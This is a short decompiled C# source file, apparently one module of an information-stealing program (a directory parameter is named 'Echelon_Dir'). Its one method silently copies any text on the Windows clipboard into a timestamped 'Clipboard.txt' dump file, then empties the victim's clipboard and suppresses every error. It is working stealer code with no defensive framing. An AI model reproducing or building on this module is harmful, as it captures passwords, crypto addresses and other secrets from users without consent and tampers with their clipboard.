using System;
using System.IO;
using System.Windows;

namespace Mist
{
	// Token: 0x0200004A RID: 74
	public static class BuffBoard
	{
		// Token: 0x06000215 RID: 533 RVA: 0x0000FEA0 File Offset: 0x0000E0A0
		public static void GetClipboard(string Echelon_Dir)
		{
			try
			{
				if (Clipboard.ContainsText())
				{
					File.WriteAllText(Echelon_Dir + "\\Clipboard.txt", string.Concat(new string[]
					{
						"[",
						Help.date,
						"]\r\n\r\n",
						ClipboardNative.GetText(),
						"\r\n\r\n"
					}));
					NativeMethods.EmptyClipboard();
				}
			}
			catch
			{
			}
		}
	}
}
